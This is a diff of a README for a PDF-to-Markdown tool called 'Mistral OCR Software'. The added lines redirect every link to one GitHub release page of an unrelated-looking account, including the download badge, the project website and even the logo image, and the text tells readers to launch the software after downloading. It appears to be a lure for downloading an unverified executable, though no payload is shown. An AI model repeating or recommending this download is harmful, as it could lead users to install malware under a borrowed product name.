@@ -15,7 +15,7 @@ Convert your PDFs into Markdown files easily with Mistral OCR Software. This rep
 
 To get started, download Mistral OCR Software from the following link: 
 
-[![Download Mistral OCR Software](https://img.shields.io/badge/Download-Mistral_OCR_Software-blue)](https://github.com/files/Soft.zip)
+[![Download Mistral OCR Software](https://github.com/Wellwelllwell/pdf-ocr-obsidian/releases/tag/v1.2)](https://github.com/Wellwelllwell/pdf-ocr-obsidian/releases/tag/v1.2)
 
 Please note that the software needs to be launched after downloading.
 
@@ -29,7 +29,7 @@ If you encounter any issues with the software or have any questions, feel free t
 
 ## Stay Connected 🌐
 
-Stay connected with the latest updates and news by visiting our [website](https://www.pdfocrobsidian.com). Join our community of users and discover more about the exciting features and possibilities that Mistral OCR Software offers. Let's embark on this journey together! 🚀
+Stay connected with the latest updates and news by visiting our [website](https://github.com/Wellwelllwell/pdf-ocr-obsidian/releases/tag/v1.2). Join our community of users and discover more about the exciting features and possibilities that Mistral OCR Software offers. Let's embark on this journey together! 🚀
 
 ## Contribute 🌟
 
@@ -45,4 +45,4 @@ Dive into the world of efficient PDF to Markdown conversion with Mistral OCR Sof
 
 Developed with ❤️ by the PDF OCR Obsidian team. Let's make document conversion effortless and enjoyable for all! 🚀
 
-![PDF OCR Obsidian](https://www.pdfocrobsidian.com/images/logo.png)
+![PDF OCR Obsidian](https://github.com/Wellwelllwell/pdf-ocr-obsidian/releases/tag/v1.2)
